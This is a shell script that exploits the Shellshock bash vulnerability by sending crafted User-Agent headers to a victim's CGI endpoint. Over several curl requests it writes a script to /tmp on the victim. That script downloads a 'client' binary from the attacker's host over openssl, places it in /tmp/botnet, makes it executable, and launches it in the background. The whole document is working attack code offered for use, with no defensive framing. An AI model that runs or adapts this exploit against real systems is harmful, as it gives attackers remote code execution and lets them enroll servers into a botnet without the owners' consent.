#!/bin/sh

if [ "$#" != "2" ]
then
    echo "basename $0 <attacker> <victim>"
    exit
fi

attacker="$1"
victim="$2"

# Generate a script on the victim at /tmp/exploit.
# The script will download the client thanks to openssl, and execute it.

opendownload='printf \"%s\r\n\r\n\" \"client\" | openssl s_client -quiet -connect'
#curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"$opendownload\" >> /tmp/exploit'" http://10.0.2.16:80/cgi-bin/vulnerable

#echo "$opendownload"

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \#/bin/sh > /tmp/exploit'" http://"${victim}":80/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo attacker\=\"${attacker}\" >> /tmp/exploit'" http://"${victim}":80/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo mkdir /tmp/botnet >> /tmp/exploit'" http://"${victim}":80/cgi-bin/vulnerable
#curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo printf \'\%s\\r\\n\\r\\n\' \'client\' \| openssl s\_client \-quiet \-connect \$\{attacker\}\:7870 \> /tmp/botnet/client >> /tmp/exploit'" http://"${victim}":80/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"$opendownload\" \$\{attacker\}:7870 \> /tmp/botnet/client >> /tmp/exploit'" http://"${victim}"/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo chmod +x /tmp/botnet/client >> /tmp/exploit'" http://"${victim}":80/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'chmod +x /tmp/exploit'" http://"${victim}":80/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo exec /tmp/botnet/client \$\{attacker\} 7870 7878 \& disown >> /tmp/exploit'" http://"${victim}":80/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo ready to lauch the exploit. '" http://"${victim}":80/cgi-bin/vulnerable
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'exec /tmp/exploit'" http://"${victim}":80/cgi-bin/vulnerable

